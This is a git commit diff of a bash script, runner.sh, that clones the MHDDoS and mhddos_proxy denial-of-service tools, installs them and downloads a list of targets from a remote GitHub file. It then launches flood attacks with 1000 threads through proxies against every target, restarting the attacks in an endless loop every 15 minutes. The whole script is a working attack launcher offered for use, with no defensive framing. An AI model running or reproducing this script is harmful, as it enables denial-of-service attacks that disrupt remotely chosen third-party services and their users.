de2bc5fac79c85c97a7213904fae7d5d59f9d3bb
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-06 13:46:33 +0300

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -9,37 +9,27 @@ sudo pip install --upgrade pip
 cd ~
 sudo rm -r mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+python3 -m pip install -r ~/mhddos_proxy/requirements.txt
 cd mhddos_proxy
-# for avoid installing wget, otherwise it need to be added in install section
-rm proxies_config.json
-#curl -o proxies_config.json https://raw.githubusercontent.com/KarboDuck/mhddos_bash/main/proxies_config.json 
-curl -o proxies_config.json https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json
-#wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
-
+#rm proxies_config.json
+#curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
 git clone https://github.com/MHProDev/MHDDoS.git
-#change commit SHA and uncomment next 3 lines for revert to certain commit, when something code wrong happened
-#cd MHDDoS
-#git reset --hard d680dca8066c0fcea5ce59ece1ddf587a9eed79b
-#cd ..
-python3 -m pip install -r MHDDoS/requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
 rpc="--rpc 1000"
 proxy_upd="-p 3600"
 debug="--debug"
 
-# Restart attacks and update targets every 20 minutes
+# Restart attacks and update targets every 15 minutes
 while true
 do
    pkill -f start.py; pkill -f runner.py 
-   # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.
+   # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-   echo -e "\nNumber of targets in list: " $list_size "\n"
    while [[ $list_size = "0"  ]]
       do
             sleep 5
             list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-            echo -e "\nNumber of targets in list: " $list_size "\n"
       done
    for (( i=1; i<=list_size; i++ ))
       do
@@ -47,5 +37,5 @@ do
             echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
-sleep 20m
+sleep 15m
 done
